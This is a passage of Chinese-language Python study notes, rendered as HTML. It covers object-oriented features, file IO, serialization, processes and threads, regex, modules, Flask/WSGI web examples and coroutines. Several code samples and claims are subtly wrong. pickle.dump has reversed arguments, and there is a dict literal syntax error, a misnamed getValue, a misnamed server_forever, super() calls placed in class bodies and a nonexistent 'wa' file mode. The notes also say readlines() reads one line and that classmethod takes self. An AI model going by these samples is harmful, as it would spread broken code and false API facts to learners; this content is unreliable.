<li><code>class &lt;class_name&gt;(&lt;继承的类&gt;)</code>，继承父类方法和父类中<code>__init__</code>方法设置的变量，覆写父类方法
-<code>鸭子类型</code>(file-like object),只有变量对象有这个<code>方法</code>、<code>变量</code>就可以，不管这个对象是否是子类</li>
</ul>
</li>
<li>4.获取对象信息
<ul>
<li>
<p><code>type(&lt;参数&gt;)</code>函数：获取<code>参数</code>的类型。</p>
</li>
<li>
<p><code>import types</code> 导入types模块
一些类型，可进行判断
<code>types.FunctionType</code>
<code>types.BuiltinFunctionType</code>
<code>types.LambdaType</code>
<code>types.GeneratorType</code></p>
</li>
<li>
<p><code>isinstance(变量,类型)</code>，可用于判断自定义的类，方法类型
<code>isinstance(变量,(类型1,类型2))</code>,可用于判断是否是<code>类型1</code>，<code>类型2</code>之一</p>
</li>
<li>
<p><code>dir(&lt;对象实例&gt;)</code>,获取对象所有属性和方法</p>
<ul>
<li><code>len('ABC')等价于'ABC'.__len__()</code></li>
<li><code>hasattr(&lt;对象实例&gt;,&lt;属性&gt;)</code>,判断是否存在这个<code>&lt;属性&gt;</code></li>
<li><code>setattr(&lt;对象实例&gt;,&lt;属性&gt;,[属性默认值])</code>,设置<code>&lt;属性&gt;</code>值</li>
<li><code>getattr(&lt;对象实例&gt;,&lt;属性&gt;)</code>,获取<code>&lt;属性&gt;</code></li>
</ul>
</li>
<li>
<p>类属性和实例属性</p>
</li>
</ul>
<pre><code>class A(object):
	name = &#x27;A&#x27; #类属性，直接通过 A.name访问
	def __init__(self,a):
	 	self.a =a #实例属性
</code></pre>
</li>
</ul>
<h3 id="2-12-mian-xiang-dui-xiang-gao-ji-bian-cheng">2.12 面向对象高级编程<a class="zola-anchor" href="#2-12-mian-xiang-dui-xiang-gao-ji-bian-cheng" aria-label="Anchor link for: 2-12-mian-xiang-dui-xiang-gao-ji-bian-cheng">🔗</a></h3>
<ul>
<li>
<p>1.动态绑定<code>变量</code>和<code>方法</code></p>
<pre><code>from types import MethodType 
def hao():
	print(&#x27;hh&#x27;)
class A(object):
	pass
a = A()
a.name=&#x27;aa&#x27; #动态绑定变量，只作用当前实例
a.hao=MethodType(hao,a) #动态绑定方法，只作用当前实例
A.hao=hao #类的所有实例绑定方法
print(a.name)
</code></pre>
</li>
<li>
<p>2.使用<code>__slots__</code> 限制实例绑定的属性</p>
<pre><code>class A(object):
	__slots__=(&#x27;name&#x27;,&#x27;age&#x27;) #tuple类型，表示只允许添加name和age的属性
class A2(A):
	pass
a = A()
a.name=&#x27;a&#x27;
a.age=&#x27;b&#x27;
a.sc=&#x27;c&#x27;#AttributeError
a = A2()
a.sc = &#x27;c&#x27; #子类，不受影响
#如果A2增加`__slots__=(&#x27;sc&#x27;)`那么A2将限制包括父类的name,age和sc，3个属性
</code></pre>
</li>
<li>
<p>3.<code>@property</code>，修饰一个方法，用于属性直接可读操作，
并且生成<code>@&lt;方法名&gt;.setter</code>进行直接可写操作。
在不用调用(set/get)方法下，直接操作属性并进行检查判断。（等价于动态绑定属性+属性检查）</p>
<pre><code>class A(object):

	@property
	def score(self):
		return self.__score
	@score.setter
	def score(self,value):
		if not (isinstance(value,int)):
			raise ValueError(&#x27;score must be an integer!&#x27;)
		if (value&lt;0 or value&gt;100):
			raise ValueError(&#x27;score between 0 and 100!&#x27;)
		self.__score=value
#可以通过直接访问方式
a = A();
a.score=10
print(a.score)
a.score=101 #ValueError
</code></pre>
</li>
<li>
<p>4.多重继承</p>
<ul>
<li>MixIn：一个类实现多个功能，可通过多继承方式</li>
</ul>
<pre><code>class A(object):
	def run(self):
		print(&#x27;A&#x27;)
	def run1(self):
		print(&#x27;run1() A&#x27;)
class B(object):
	def run(self):
		print(&#x27;B&#x27;)
class C(B,A):
	pass
#执行
a = C()
a.run()
a.run1()
</code></pre>
</li>
<li>
<p>5.定制类，类中特殊函数覆写</p>
<ul>
<li><code>__str__</code>: print(&lt;类对象&gt;)中打印的内容</li>
<li><code>__repr__</code>: 打印类对象的内容</li>
<li><code>__iter__</code>:设置为迭代对象用于<code>for ... in循环</code>，实现<code>__next__</code>方法</li>
<li><code>__getitem__</code>:跟获取数组下标一样获取数据项，<code>&lt;类对象&gt;[0]、&lt;类对象&gt;[1]</code>
<ul>
<li><code>&lt;类对象&gt;[:]、&lt;类对象&gt;[:2]</code>也可以切片对象，
那么需要判断处理<code>isinstance(&lt;变量&gt;,slice)</code></li>
</ul>
</li>
<li><code>__getattr__</code>:覆写，那么py会先根据这个方法尝试获取属性</li>
<li><code>__call__</code>:类对象可以作为函数调用使用，(PS: s是类对象，那么可以s()进行调用)
<ul>
<li><code>callable(&lt;类实例&gt;)</code>：判断类对象是否作为<code>可调用的函数</code></li>
</ul>
</li>
</ul>
</li>
<li>
<p>6.枚举类</p>
<ul>
<li>定义：
<code>from enum import Enum</code>
索引引用[]从1开始</li>
<li><code>Enum(&lt;枚举类型名称&gt;,(&lt;枚举1&gt;,&lt;枚举2&gt;))</code></li>
<li><code>class A(Enum):</code> 枚举自定义派生类</li>
</ul>
<pre><code>from enum import Enum
w = Enum(&#x27;weekly&#x27;,(&#x27;Sun&#x27;,&#x27;Mon&#x27;,&#x27;Tue&#x27;,&#x27;Wed&#x27;,&#x27;Thu&#x27;,&#x27;Fri&#x27;,&#x27;Sat&#x27;))
w(1) #输出 &lt;weekly.Sun:1&gt;
w(1).name #输出&#x27;Sun&#x27;
w(1).value #输出1

from enum import unique
@unique #防止重复值	
class A(Enum):
	Sun=0 
	Mon=1
	Tue=2
	Wed=3
	Thu=4
	Fri=5
	Sat=6
A.Sun.name #输出&#x27;Sun&#x27;
A.Sun.value #输出0
</code></pre>
</li>
<li>
<p>7.使用元类</p>
<ul>
<li><code>type(&lt;类名&gt;,(&lt;父类&gt;,[&lt;父类&gt; 0~n个]),dict(&lt;方法名&gt;=&lt;绑定的方法&gt;))</code>：动态生成class类</li>
<li>metaclass
<ul>
<li>使用：<code>class &lt;类名&gt;(&lt;父类&gt;,metaclass=&lt;metaclass类&gt;)</code>
其中metaclass=<code>&lt;metaclass类&gt;</code>，用于生成&lt;类名&gt;实例
metaclass类
1.继承自<code>type</code>
2.实现<code>__new__(cls, name, bases, attrs)</code>方法实现创建新的实例
cls：&lt;metaclass类&gt;
name:创建类的名字
base:创建类继承的父类集合
attr:创建类的属性/方法集合</li>
</ul>
<pre><code>class Model(type):
	def __new__(cls,name,base,attr):
		print(attr)
		attr[&#x27;ok&#x27;]=&#x27;model gen ok&#x27; #添加属性
		attr[&#x27;add&#x27;]=lambda self,value: self.append(value) #添加方法
		print(attr)
		return type.__new__(cls,name,base,attr)

class Test(list,metaclass=Model):
	pass

if(__name__==&#x27;__main__&#x27;):
	a = Test()
	print(a.ok)
	a.add(1)
	print(a)

</code></pre>
</li>
</ul>
</li>
<li>
<p>8.<code>super(&lt;class_type&gt;,&lt;class_instance&gt;)</code>调用父类函数
按照继承方法的顺序调用，称为MRO(Method Resolution Order)</p>
<pre><code>class A(object):
	super(A,self).__init__():
	print(&#x27;A&#x27;)
class B(object):
	super(B,self).__init__():
	print(&#x27;B&#x27;)
class C(A,B):
	super(C,self).__init__():
	print(&#x27;C&#x27;)
C.mro() # &lt;class C&gt;,&lt;class A&gt;,&lt;class B&gt;
C() 
#输出 B A C
#C()
#开始从C调用super()—&gt;
#下一个指向A,在A中调用super()-&gt;
#下一个指向B,在B中调用super()是object
#最后，打印B-&gt;打印A-&gt;打印C 
</code></pre>
</li>
<li>
<p>9.静态方法、类方法、实例方法</p>
<ul>
<li><code>@staticmethod</code> 静态方法 (类/实例)访问，不用写默认参数self,不能调用实例变量、类变量等</li>
<li><code>@classmethod</code>类方法，(类/实例)访问，需要有默认参数self，不能调用实例变量。</li>
<li>实例方法，实例访问，需要有默认参数self</li>
</ul>
</li>
</ul>
<h3 id="2-13-cuo-wu-diao-shi-he-ce-shi">2.13 错误、调试和测试<a class="zola-anchor" href="#2-13-cuo-wu-diao-shi-he-ce-shi" aria-label="Anchor link for: 2-13-cuo-wu-diao-shi-he-ce-shi">🔗</a></h3>
<ul>
<li>1.异常捕获
<ul>
<li><code>try...except...as e ... finally...</code></li>
</ul>
<pre><code>try: 
&lt;执行&gt;
except &lt;异常类&gt; as e:
	&lt;执行&gt;
finally:
	&lt;执行&gt;
</code></pre>
<ul>
<li><code>logging</code> 记录错误</li>
<li><code>raise</code> 抛出错误</li>
</ul>
</li>
<li>2.日志输出
<ul>
<li><code>assert</code>代替print
使用<code>python -O &lt;文件名&gt;.py</code>其中 -O大写字母O表示关闭断言
那么,<code>assert</code>将会被<code>pass</code>代替</li>
<li><code>logging</code> 和android logcat类似</li>
</ul>
<pre><code>import logging 
logging.basicConfig(level=logging.INFO) #添加logging显示等级
</code></pre>
</li>
<li>3.单步调试<code>pdb</code>：python -m pdb xxx.py</li>
<li>4.单元测试 import <code>unittest</code>模块</li>
<li>5.文档测试 import <code>re</code>模块</li>
</ul>
<h3 id="2-14-iobian-cheng">2.14 IO编程<a class="zola-anchor" href="#2-14-iobian-cheng" aria-label="Anchor link for: 2-14-iobian-cheng">🔗</a></h3>
<ul>
<li>
<p>1.文件读写</p>
<ul>
<li>1.获取文件对象 <code>open(&lt;路径&gt;,'r')</code> 获取文件对象，标识符r=读，w=写 默认读取文本文件</li>
<li>2.读取文件
<ul>
<li><code>read()</code>一次性读取文件内容</li>
<li><code>read(size)</code>反复调用读取</li>
<li><code>readlines()</code>读取一行</li>
</ul>
</li>
<li>3.关闭文件
<ul>
<li><code>close()</code></li>
<li><code>with open(&lt;路径&gt;,'r') as f: print(f.read())</code>会自动调用close()，不用自己调用</li>
</ul>
</li>
<li>二进制文件<code>rb</code> 标识符表示</li>
<li>字符编码，读取非UTF-8文件<code>open(&lt;路径&gt;,'r',encoding='gbk',error='ignore')</code>
error='ignore'用于读取编码错误时，忽略处理</li>
<li>4.写文件
<ul>
<li>标识符：<code>w</code>写文本文件，<code>wb</code>写二进制文件 <code>wa</code>(append)追加形式写入(其他是覆盖方式)</li>
<li><code>write()</code></li>
<li><code>close()</code>写完需要关闭，也可以用<code>with open(...) as f:</code>方式自动关闭</li>
</ul>
</li>
</ul>
</li>
<li>
<p>2.StringIO和BytesIO</p>
<ul>
<li>1.StringIO</li>
</ul>
<pre><code>from io import StringIO
f = StringIO() #内存中字符操作
f.write(&#x27;hello &#x27;)
f.write(&#x27;world&#x27;)
f.getValue()# &#x27;hello world&#x27;
while True:
	s = f.readlines()
	if(s==&#x27; &#x27;):
		break
	print(s.strip())#strip()去掉空格
</code></pre>
<ul>
<li>2.BytesIO</li>
</ul>
<pre><code>from io import BytesIO
f = BytesIO()
f = BytesIO(b&#x27;\xe5\xad\x97\xe8\x8a\x82&#x27;)
f.write(&#x27;字节&#x27;.encode(&#x27;utf-8&#x27;))#写入utf-8编码的字节
f.close()
f.read()
</code></pre>
</li>
<li>
<p>3.os模块(系统信息，创建目录)</p>
<ul>
<li><code>import os</code>
<code>os.name</code> posix表示类Unit系统(Linux、Unix、Mac OS),nt表示windows
<code>os.uname()</code> posix上提供显示系统信息
<code>os.environ()</code>环境变量
<code>os.environ().get(</code>PATH<code>)</code> 某个环境变量
<code>os.path.abspath('.')</code> 当前目录绝对路径
<code>os.path.join('/User','deskDir')</code> 目录下创建新目录
<code>os.path.isdir('x')</code>是否目录
<code>os.path.isfile('x')</code>是否文件
<code>os.mkdir('/User/deskDir')</code>创建新目录
<code>os.rmdir('/User/deskDir')</code>删除目录
<code>os.path.split('/User/deskDir')</code>目录和最后一个<code>/</code>的内容分离
<code>os.path.splitext('/User/deskDir')</code>目录和<code>文件扩展名</code>分离
<code>os.rename('file.txt','newfile.txt')</code>文件重命名
<code>os.remove('file.txt')</code>删除文件</li>
</ul>
<pre><code>[x for x in os.listdir(&#x27;.&#x27;) if os.path.isfile(x)]#过滤掉非文件内容
</code></pre>
<ul>
<li>shutil模块 有提供文件复制函数</li>
</ul>
</li>
<li>
<p>4.序列化</p>
<ul>
<li>pickle模块，序列化和反序列化</li>
</ul>
<pre><code>import pickle
d = [1,2,3]
#序列化
b=pickle.dumps(d) #生成序列化bytes
f = open(&#x27;file.txt&#x27;,&#x27;wb&#x27;)
pickle.dump(f,b) #生成序列化bytes，并写入到文件
f.close()
#反序列化
f.open(&#x27;file.txt&#x27;,&#x27;rb&#x27;)
pickle.loads(b) #反序列化bytes
pickle.load(f) #反序列化文件内容
f.close()
</code></pre>
<ul>
<li>JSON</li>
</ul>
<pre><code>{}  		&lt;--&gt;  dict
[]  		&lt;--&gt;  list
&quot;string&quot;  	&lt;--&gt;  str
1234.56  	&lt;--&gt;  int或float
true&#x2F;false  &lt;--&gt;  True&#x2F;False
null 		&lt;--&gt;  None

import json
d = dict(&#x27;name&#x27;:&#x27;n&#x27;,&#x27;age&#x27;:12)
j = json.dumps(d) #返回json
json.loads(j) #json转为类型
</code></pre>
<ul>
<li>class对象 json和反json
<code>json.dumps(&lt;class对象&gt;,default=&lt;转换函数&gt;)</code> 转json
<code>json.loads(&lt;json数据&gt;,object_hook=&lt;转换函数&gt;)</code> 反json</li>
</ul>
<pre><code>import json
def student2dict(stu):
	return {&#x27;name&#x27;:stu.name,&#x27;age&#x27;:stu.age}
def dict2student(d):
	return Student(d[&#x27;name&#x27;],d[&#x27;age&#x27;])
s = Student(&#x27;a&#x27;,22)
j = json.dumps(s,default=&#x27;student2dict&#x27;) #class对象转json
json.loads(j,object_hook=dict2student) #json-&gt;dict对象-&gt;转student对象
</code></pre>
</li>
<li>
<p>5.进程和线程</p>
<ul>
<li>
<p>多进程</p>
<ul>
<li><code>fork()</code>在类Unixt系统中，调用1次返回2次，分别是父进程返回和子进程返回。</li>
<li><code>getpid()</code>当前进程id</li>
<li><code>getppid()</code>获得父进程id
子进程返回0
父进程返回子进程id</li>
</ul>
<pre><code>import os
pid = os.fork() #Windows没有fork调用
if pid == 0 : #子进程
if not pid ==0 : #父进程
</code></pre>
<ul>
<li>multiprocessing 跨平台多进程模块</li>
</ul>
<pre><code>from multiprocessing import Process
import os 
def run_child_proc(name):
	print(&#x27;name %s&#x27;%name)
if(__name__==&#x27;__main__&#x27;):
	#子进程执行函数run_child_proc,args是dict类型所以加,
	p = Process(target=run_child_proc,args=(&#x27;test&#x27;,)) #创建进程
	p.start() #子进程开始启动
	p.join() #等待子进程p执行完成后，用于进程协调同步
	print(&#x27;child proc closed&#x27;)
</code></pre>
<ul>
<li>Pool 多进程</li>
</ul>
<pre><code>from multiprocessing import Pool
import os,time
def run_child_proc(name):
	time.sleep(1 * 1)
	print(&#x27;child proc name %s&#x27;%name,&#x27; pid:&#x27;,os.getpid())

if(__name__==&#x27;__main__&#x27;):
	print(&#x27;parent Process pid = %s&#x27;%os.getpid())
	p = Pool(3)
	for i in range(3):
		p.apply_async(run_child_proc,(i,))#多进程异步执行,进程池限制3个进程 默认4个
	print(&#x27;Wait&#x27;)
	p.close() #不允许添加新的进程
	p.join() #等待进程全部执行完成
	print(&#x27; All child proc closed! &#x27;)
</code></pre>
<ul>
<li>子进程<code>subprocess</code>模块</li>
<li>进程间通信通过Queue、Pipes实现</li>
</ul>
</li>
<li>
<p>多线程</p>
<ul>
<li><code>_thread</code>和<code>threading</code>模块</li>
</ul>
<pre><code>import threading

def new_thread_run():
	print(&#x27;threading:%s&#x27;%threading.current_thread().name)
print(&#x27;main thread:%s&#x27;%threading.current_thread().name)
#不要name，py会自动起名字
t = threading.Thread(target=new_thread_run,name=&#x27;new_thread&#x27;)
t.start()
t.join()
print(&#x27;main thread:%s closed!&#x27;%threading.current_thread().name)
</code></pre>
<ul>
<li>Lock 线程上锁</li>
</ul>
<pre><code>import threading,time
value=0
lock = threading.Lock() #获得锁对象
def changeValue():
	global value
	value=value+1
	time.sleep(0.0001)
	value=value-1

def new_thread_run():
	lock.acquire() #获取锁
	for i in range(1000):
		changeValue()
	print(threading.current_thread().name,&#x27;value&#x27;,value)
	lock.release() #释放锁
t1 = threading.Thread(target=new_thread_run)
t2 = threading.Thread(target=new_thread_run)
t1.start()
t2.start()
t1.join()
t2.join()
print(threading.current_thread().name,&#x27;value&#x27;,value)
print(&#x27;main thread closed !&#x27;)
</code></pre>
</li>
<li>
<p>ThreadLocal:每个线程单独存储线程内部使用的变量</p>
</li>
</ul>
<pre><code>import threading

global_local = threading.local() #线程本地变量
def process_t():
	print(&#x27;thead: %s tag:%s&#x27;%(threading.current_thread().name,global_local.tag))
def new_thread_run(tag):
	global_local.tag = tag
	process_t()
t1 = threading.Thread(target=new_thread_run,args=(&#x27;OK&#x27;,))
t2 = threading.Thread(target=new_thread_run,args=(&#x27;HAO&#x27;,))
t1.start()
t2.start()
t1.join()
t2.join()
print(&#x27;main thread closed !&#x27;)
	
</code></pre>
<pre><code>  - 多任务模型，切换作业有代价，就是保存&#x2F;恢复现场
  - Nginx 支持异步IO的Web服务器
  - 协程：Python语言中，单线程的异步编程模型
</code></pre>
<ul>
<li>分布式进程:<code>multiprocessing</code>的子模块<code>managers</code>支持</li>
</ul>
</li>
</ul>
<h3 id="2-15-zheng-ze-biao-da-shi">2.15 正则表达式<a class="zola-anchor" href="#2-15-zheng-ze-biao-da-shi" aria-label="Anchor link for: 2-15-zheng-ze-biao-da-shi">🔗</a></h3>
<ul>
<li><code>import re</code>：导入<code>re</code>模块</li>
<li><code>r</code>：正则表达式前面加<code>r</code>忽略python中字符串的转义(PS:<code>\\</code>== r<code>\</code>，字符串中输入<code>\</code>要转义)</li>
<li><code>re.match(&lt;正则表达式&gt;,&lt;需要匹配的字符串&gt;)</code>：匹配</li>
<li><code>re.compile(&lt;正则表达式&gt;)</code>：预编译</li>
<li><code>groups()</code>获得所有匹配的组</li>
<li><code>group(0)</code>默认匹配的组</li>
<li><code>group(1)，group(2)</code>表示要提取的组1,2 正则表达式中用<code>()</code>表示提取</li>
<li>正则表达式匹配过程(对于经常匹配的，预编译可以提高效率)
<ul>
<li>1.编译正则表达式，如果正则表达式不合法，报错。</li>
<li>2.用编译后的正则表达式去匹配字符串</li>
</ul>
</li>
</ul>
<h3 id="2-16-nei-jian-mo-kuai">2.16 内建模块<a class="zola-anchor" href="#2-16-nei-jian-mo-kuai" aria-label="Anchor link for: 2-16-nei-jian-mo-kuai">🔗</a></h3>
<ul>
<li>1.<code>datetime</code> 处理日期和时间标准库
<ul>
<li><code>from datetime import datetime</code>: datetime.now()获取现在时间</li>
<li><code>import datetime</code>: datetime.datetime.now()获取现在时间</li>
</ul>
</li>
<li>2.<code>collections</code> 集合标准库</li>
<li>3.<code>base64</code></li>
<li>4.<code>struct</code> 解决bytes和其他数据类型转换的库</li>
<li>5.<code>hashlib</code> 摘要算法库(MD5,SHA1)，生成hash值</li>
<li>6.<code>hmac</code>： (数据+密钥)的方式生成摘要hash值</li>
<li>7.<code>itertools</code>:操作迭代对象的库</li>
<li>8.<code>contextlib</code>:上下文对象，提供一些文件资源释放的便捷操作</li>
<li>9.<code>urllib</code>:操作URL的库，http请求之类的</li>
<li>10.<code>xml</code>:xml操作
<ul>
<li>DOM：整个XML一次性读入</li>
<li>SAX：边读边解析</li>
</ul>
</li>
<li>11.<code>HTMLParser</code>：解析Html，解析html中文本、图像等</li>
</ul>
<h3 id="2-17-di-san-fang-mo-kuai">2.17 第三方模块<a class="zola-anchor" href="#2-17-di-san-fang-mo-kuai" aria-label="Anchor link for: 2-17-di-san-fang-mo-kuai">🔗</a></h3>
<ul>
<li>1.图像处理：切片、旋转、滤镜、模糊、调色板等
<ul>
<li><code>PIL</code>(python image library):仅支持python2.7</li>
<li><code>Pillow</code>:支持python3.x，+新特性</li>
<li><code>pip install pillow</code> 安装</li>
</ul>
</li>
<li>2.<code>requests</code> 网络访问库</li>
<li>3.<code>chardet</code> 编码检测库</li>
<li>4.<code>psutil</code>(process system utilies) 获取系统信息工具库</li>
<li>5.<code>virtualenv</code> 建立隔离的运行环境
<ul>
<li>每个应用使用不同python版本运行环境处理</li>
</ul>
</li>
<li>6.图形界面库
<ul>
<li><code>tkinter</code>：python内置的GUI编程库</li>
<li><code>tk</code>、<code>wxWidgets</code>、<code>Qt</code>、<code>GTK</code>：第三方GUI库</li>
<li>海龟绘图库(Turtle Graphics):python内置,通过指挥一只小海龟在屏幕上绘图
<ul>
<li>起源 LOGO语言：专门给儿童学习编程的语言，特色是通过一只小海龟绘图。</li>
<li><code>import turtle import *</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-18-wang-luo-bian-cheng">2.18 网络编程<a class="zola-anchor" href="#2-18-wang-luo-bian-cheng" aria-label="Anchor link for: 2-18-wang-luo-bian-cheng">🔗</a></h3>
<ul>
<li>TCP/UDP编程</li>
<li><code>import socket</code> 引入socket库</li>
</ul>
<h3 id="2-19-dian-zi-you-jian">2.19 电子邮件<a class="zola-anchor" href="#2-19-dian-zi-you-jian" aria-label="Anchor link for: 2-19-dian-zi-you-jian">🔗</a></h3>
<ul>
<li>SMTP 发送邮件协议(内置模块)
<ul>
<li><code>import smtplib</code>：发送邮件模块</li>
<li><code>import email</code>:构造邮件模块</li>
</ul>
</li>
<li>POP3 收取邮件协议(内置模块)(POP协议，最新版本号3)
<ul>
<li>1.<code>import poplib</code>：收邮件模块</li>
<li>2.<code>import email</code>:解析原始文本，构成邮件对象</li>
</ul>
</li>
</ul>
<h3 id="2-20-shu-ju-ku">2.20 数据库<a class="zola-anchor" href="#2-20-shu-ju-ku" aria-label="Anchor link for: 2-20-shu-ju-ku">🔗</a></h3>
<p>(python中,DB-API通用,数据库操作接口类似)</p>
<ul>
<li>SQLite(内置模块)
<ul>
<li><code>import sqlite3</code></li>
</ul>
</li>
<li>MySQL
<ul>
<li>1.安装MySQL
<ul>
<li>windows下，安装选择utf-8</li>
<li>linux,mac os下，需要编辑配置文件修改编码，改为utf-8。
<ul>
<li><code>配置文件默认存放在/etc/my.cnf或者/etc/mysql/my.cnf</code></li>
</ul>
</li>
<li>PS:MySQL版本&gt;=5.5.3，编码可设置为utf-8mb4(和utf-8兼容)，
还可支持Unicode最新标准，可显示emoji字符</li>
</ul>
</li>
<li>2.安装MySQL驱动
<code>pip install mysql-connector-python --allow-external mysql-connector-python</code>
或<code>pip install mysql-connector</code></li>
</ul>
</li>
<li><code>sqlalchemy</code>:第三方ORM(对象关系映射)框架
<ul>
<li><code>pip install sqlalchemy</code></li>
</ul>
</li>
</ul>
<h3 id="2-21-webkai-fa">2.21 Web开发<a class="zola-anchor" href="#2-21-webkai-fa" aria-label="Anchor link for: 2-21-webkai-fa">🔗</a></h3>
<ul>
<li>
<p>JSP：html+java的脚步代码形式</p>
</li>
<li>
<p>HTML</p>
<ul>
<li>HTML 网页</li>
<li>CSS(Cascading Style Sheets)层级样式表</li>
<li>JS 执行脚本</li>
</ul>
</li>
<li>
<p>Web应用流程</p>
<ul>
<li>1.浏览器发送http请求。</li>
<li>2.服务端接收请求，生成html文档。</li>
<li>3.服务端把html文档，作为Body发送给浏览器。</li>
<li>4.浏览器响应，取出Body中的html文档并显示。</li>
<li>现存Http服务器（Apache、Nginx、Lighttpd等）：用于接收用户请求，从文件读取html，响应返回。</li>
<li>Python用于动态生成html文档</li>
</ul>
</li>
<li>
<p>WSGI接口(Web Server GateWay Interface)</p>
<ul>
<li><code>import wsgiref</code> 内置的WSGI服务器</li>
<li>ctrl + c终止服务器</li>
</ul>
<pre><code>#Web应用程序WSGI处理函数
#包含2个参数:environ包含http请求信息的dict对象，start_response发送HTTP响应的函数
#start_response函数包含2个参数：
#1.响应码，2.一组list表示的Http Header，使用str表示的tuple类型
#hello.py
from wsgiref.simple_server import make_server
def application(environ,start_response):
	start_response(&#x27;200 OK&#x27;,[(&#x27;Content-Type&#x27;,&#x27;text&#x2F;html&#x27;)]) #响应Header
	return [b&#x27;&lt;html&gt;&lt;body&gt;hello world&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&#x27;] #响应Body
httpd = make_server(&#x27;&#x27;,8000,application) #1.ip地址，2.端口，3.处理函数
httpd.server_forever()#监听请求
</code></pre>
</li>
<li>
<p>WSGI 第三方框架</p>
<ul>
<li>Flask</li>
</ul>
<pre><code>pip install flask #安装flask
#flask默认在5000端口上
from flask import Flask
from flask import request
app = Flask(__name__)
@app.route(&#x27;&#x2F;&#x27;,methods=[&#x27;GET&#x27;]) 
def index():
	return &#x27;&lt;h&gt;hello world&lt;&#x2F;h&gt;&#x27;

@app.route(&#x27;&#x2F;login&#x27;,methods=[&#x27;GET&#x27;]) #&#x2F;login选项框
def login():
	return &#x27;&#x27;&#x27;&lt;form action=&quot;&#x2F;login&quot; method=&quot;post&quot;&gt;
			&lt;p&gt;&lt;input name=&quot;username&quot;&gt;&lt;&#x2F;p&gt;
			&lt;p&gt;&lt;input name=&quot;password&quot;&gt;&lt;&#x2F;p&gt;
			&lt;p&gt;&lt;button type=&quot;submit&quot;&gt;Sign In&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;
			&lt;&#x2F;form&gt;&#x27;&#x27;&#x27;
#flask通过request.form[&#x27;name&#x27;]来获取表单的内容
@app.route(&#x27;&#x2F;login&#x27;,methods=[&#x27;POST&#x27;])#&#x2F;login输入进行post请求
def loginP():
	if request.form[&#x27;username&#x27;]==&#x27;admin&#x27; and request.form[&#x27;password&#x27;]==&#x27;123456&#x27;:
		return &#x27;&lt;h&gt;hello admin&lt;&#x2F;h&gt;&#x27;
	return &#x27;&lt;h&gt;login error!&lt;&#x2F;h&gt;&#x27;
if(__name__==&#x27;__main__&#x27;):
	app.run()
</code></pre>
<ul>
<li>Django:全能型Web框架</li>
<li>web.py:小巧的Web框架</li>
<li>Bottle:和Flask类似的Web框架</li>
<li>Tornado:Facebook开源异步Web框架</li>
</ul>
</li>
<li>
<p>html模板：分离html和业务逻辑 MVC模式</p>
<ul>
<li>模板：独立html文件，内部传入数据变量的格式</li>
<li>flask
<ul>
<li>jinja2：默认支持模板</li>
</ul>
<pre><code>`pip install jinja2`
	- `{{name}}`：html中表示变量name
	- `{%...%}`：html中`...`表示指令写的地方
</code></pre>
<pre><code>#模板html存放在目录templates,templates和.py运行文件同级目录下
#render_template() 显示模板
#index.html
&lt;html&gt;
&lt;body&gt;
&lt;h&gt;hello world&lt;&#x2F;h&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
#login.html
&lt;html&gt;
&lt;body&gt;
{% if message %}		
&lt;p&gt;{{message}}&lt;&#x2F;p&gt;
{% endif %}
&lt;form action=&quot;&#x2F;login&quot; method=&quot;post&quot;&gt;
	&lt;p&gt;&lt;input name=&quot;username&quot; value=&quot;{{username}}&quot;&gt;&lt;&#x2F;p&gt;
	&lt;p&gt;&lt;input name=&quot;password&quot;&gt;&lt;&#x2F;p&gt;
	&lt;p&gt;&lt;button type=&quot;submit&quot;&gt;Sign In&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;
	&lt;&#x2F;form&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
#login_ok.html
&lt;html&gt;
&lt;body&gt;
&lt;h&gt;hello {{name}}&lt;&#x2F;h&gt;
&lt;&#x2F;body&gt;
&lt;&#x2F;html&gt;
#index.py
from flask import Flask
from flask import request
from flask import render_template
app = Flask(__name__)
@app.route(&#x27;&#x2F;&#x27;,methods=[&#x27;GET&#x27;])
def index():
	return render_template(&#x27;index.html&#x27;)

@app.route(&#x27;&#x2F;login&#x27;,methods=[&#x27;GET&#x27;])
def login():
	return render_template(&#x27;login.html&#x27;)
@app.route(&#x27;&#x2F;login&#x27;,methods=[&#x27;POST&#x27;])
def loginP():
	if request.form[&#x27;username&#x27;]==&#x27;admin&#x27; and request.form[&#x27;password&#x27;]==&#x27;123456&#x27;:
		return render_template(&#x27;login_ok.html&#x27;,username=&#x27;admin&#x27;)
	else:
		return render_template(&#x27;login.html&#x27;,message=&#x27;Error username or password!&#x27;,username=request.form[&#x27;username&#x27;])
if(__name__==&#x27;__main__&#x27;):
	app.run()
</code></pre>
<ul>
<li>Mako模板
<ul>
<li>${name} 变量</li>
<li>&lt;%...%&gt; 指令</li>
</ul>
</li>
<li>Cheetah模板
<ul>
<li>${name} 变量</li>
<li>&lt;%...%&gt; 指令</li>
</ul>
</li>
<li>Django</li>
</ul>
<pre><code>- {{name}} 变量
- {%...%} 指令
</code></pre>
</li>
</ul>
</li>
</ul>
<h3 id="2-22-yi-bu-io">2.22 异步IO<a class="zola-anchor" href="#2-22-yi-bu-io" aria-label="Anchor link for: 2-22-yi-bu-io">🔗</a></h3>
<ul>
<li>
<p>异步IO模型：利用主线程消息循环。执行IO操作时，只是发出IO指令不等待结果，继续执行其他代码，等待
IO通知后再来处理。</p>
</li>
<li>
<p>协程：一个线程执行多个函数之间不按顺序调用，切换调用(函数调用一半切换到另一个函数执行)</p>
<ul>
<li>python中通过generator实现了协程。当next(generator),
对生成generator函数进行中断处理，然后执行其他函数</li>
</ul>
<pre><code>#同一个线程内，边写边读
def read():
	r = &#x27;&#x27;
	while True:
		read = yield r
		if read:
			print(&#x27;read =&#x27;,read)

def write(r):
	r.send(None)
	i=1
	while i&lt;10:
		print(&#x27;write =&#x27;,i)
		r.send(i)
		i=i+1

r = read()
write(r)
</code></pre>
</li>
<li>
<p>asyncio:内置异步IO支持</p>
<ul>
<li><code>@asyncio.coroutine</code> generator标记为coroutine</li>
<li><code>yield from &lt;coroutine&gt;</code>切换协程</li>
<li><code>asyncio.get_event_loop()</code>消息循环</li>
<li><code>loop.run_until_complete(&lt;task()&gt;或asyncio.wait(&lt;tasks&gt;))</code> tasks=(task(),task())</li>
</ul>
</li>
</ul>
<pre><code>import threading
import asyncio

@asyncio.coroutine
def hello():
	print(&#x27;Hello world %s!&#x27;%threading.currentThread())
